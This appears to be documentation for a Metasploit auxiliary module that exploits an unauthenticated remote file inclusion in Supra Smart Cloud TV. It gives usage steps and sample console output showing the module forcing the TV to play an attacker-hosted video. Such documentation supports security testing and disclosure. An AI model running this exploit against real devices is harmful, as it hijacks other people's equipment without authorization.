## Summary

This module exploits an unauthenticated remote file inclusion which exists in Supra Smart Cloud TV. 
The media control for the device doesn't have any session management or authentication. Leveraging this, an
attacker on the local network can send a crafted request to broadcast a fake video.

**Reference:** https://www.inputzero.io/2019/06/hacking-smart-tv.html

## Verification Steps

1. `use auxiliary/admin/http/supra_smart_cloud_tv_rfi `
2. `set RHOSTS [IP]`
3. `set SRVHOST [IP]`
4. `run`

Doo-doodoodoodoodoo-doo, Epic Sax Guy will be broadcasted to the remote system.

## Sample Output

```
msf5 > use auxiliary/admin/http/supra_smart_cloud_tv_rfi 
msf5 auxiliary(admin/http/supra_smart_cloud_tv_rfi) > set SRVHOST 192.168.1.132
SRVHOST => 192.168.1.132
msf5 auxiliary(admin/http/supra_smart_cloud_tv_rfi) > set RHOSTS 192.168.1.155
RHOSTS => 192.168.1.155
msf5 auxiliary(admin/http/supra_smart_cloud_tv_rfi) > run
[*] Running module against 192.168.1.155
[*] Using URL: http://192.168.1.132:8080/
[*] Broadcasting Epic Sax Guy to 192.168.1.155:80
[+] Doo-doodoodoodoodoo-doo
[*] Sleeping for 10s serving .m3u8 and .ts files...
[*] Server stopped.
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/supra_smart_cloud_tv_rfi) >
```
